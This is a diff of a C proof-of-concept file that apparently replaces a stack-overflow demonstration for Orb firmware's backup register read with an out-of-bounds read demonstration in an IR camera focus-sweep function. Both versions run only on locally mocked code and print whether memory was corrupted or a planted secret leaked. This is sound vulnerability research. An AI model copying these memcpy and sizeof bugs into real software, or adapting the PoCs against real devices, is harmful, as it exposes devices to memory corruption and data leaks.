@@ -2,56 +2,53 @@
 #include <stdint.h>
 #include <string.h>
 
-// Mocking the BBRAM device and its functions
-uint8_t mock_bbram[10] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11, 0x22, 0x33};
+#define MAX_NUMBER_OF_FOCUS_VALUES 200
 
-int bbram_read(void *dev, uint16_t offset, size_t size, uint8_t *data) {
-    if (offset + size > 10) return -1;
-    memcpy(data, &mock_bbram[offset], size);
-    return 0;
-}
+// Simulated global state from ir_camera_system_hw.c
+static int16_t global_focus_values[MAX_NUMBER_OF_FOCUS_VALUES];
+static size_t global_num_focus_values;
+static int use_focus_sweep_polynomial;
 
-// The vulnerable function from lib/storage/backup_regs.c
-int backup_regs_read_byte(const size_t offset, uint8_t *data) {
-    // BUG: uses sizeof(data) which is the size of the pointer (4 or 8 bytes)
-    size_t size_to_read = sizeof(data);
-    printf("[!] backup_regs_read_byte: pointer size is %zu. Reading %zu bytes into %p\n", sizeof(data), size_to_read, (void*)data);
-    return bbram_read(NULL, offset, size_to_read, data);
-}
-
-// Mimicking app_init_state from main_board/src/power/boot/boot.c
-void app_init_state_sim() {
-    uint8_t buffer[16];
-    memset(buffer, 0xEE, sizeof(buffer));
-
-    uint8_t *boot_flag_ptr = &buffer[4]; // Put it in the middle
-
-    printf("[+] Before call:\n");
-    printf("    Buffer: ");
-    for(int i=0; i<16; i++) printf("%02x ", buffer[i]);
-    printf("\n");
-
-    backup_regs_read_byte(0, boot_flag_ptr);
-
-    printf("[+] After call:\n");
-    printf("    Buffer: ");
-    for(int i=0; i<16; i++) printf("%02x ", buffer[i]);
-    printf("\n");
-
-    int corrupted = 0;
-    for(int i=5; i<4 + sizeof(void*); i++) {
-        if (buffer[i] != 0xEE) corrupted = 1;
-    }
-
-    if (corrupted) {
-        printf("\n[!] BUFFER CORRUPTION DETECTED beyond the first byte!\n");
-    } else {
-        printf("\n[?] No corruption detected.\n");
-    }
+// The vulnerable function (as it was before the fix)
+void ir_camera_system_set_focus_values_for_focus_sweep_hw_vulnerable(int16_t *focus_values, size_t num_focus_values)
+{
+    global_num_focus_values = num_focus_values;
+    // BUG: Always copies 400 bytes (200 * int16_t) regardless of num_focus_values
+    memcpy(global_focus_values, focus_values, sizeof(global_focus_values));
+    use_focus_sweep_polynomial = 0;
 }
 
 int main() {
-    printf("--- Orb Firmware Stack Overflow PoC ---\n");
-    app_init_state_sim();
+    printf("--- Orb Firmware OOB Read PoC ---\n");
+
+    // Simulate memory layout in the runner thread
+    struct {
+        int16_t attacker_focus_values[1];
+        char sensitive_data[398];
+    } __attribute__((packed)) stack_frame;
+
+    // Attacker provides only 1 focus value
+    stack_frame.attacker_focus_values[0] = 0x1337;
+
+    // Adjacent memory contains sensitive information
+    strcpy(stack_frame.sensitive_data, "SECRET_TOKEN_LEAKED_FROM_STACK_MEMORY_ADJACENT_TO_PROTOBUF_BUFFER");
+
+    printf("[+] Calling vulnerable function with 1 focus value...\n");
+    ir_camera_system_set_focus_values_for_focus_sweep_hw_vulnerable(stack_frame.attacker_focus_values, 1);
+
+    printf("[+] Content of global_focus_values after OOB read:\n");
+    // Print the first few entries
+    printf("    [0]: 0x%04x (Legitimate)\n", global_focus_values[0]);
+
+    // Check for leaked data in the subsequent entries
+    char *leaked_str = (char *)&global_focus_values[1];
+    printf("    Leaked String: %s\n", leaked_str);
+
+    if (strstr(leaked_str, "SECRET_TOKEN") != NULL) {
+        printf("\n[!] SUCCESS: Detected leaked data from adjacent memory!\n");
+    } else {
+        printf("\n[?] No leak detected in this specific layout.\n");
+    }
+
     return 0;
 }
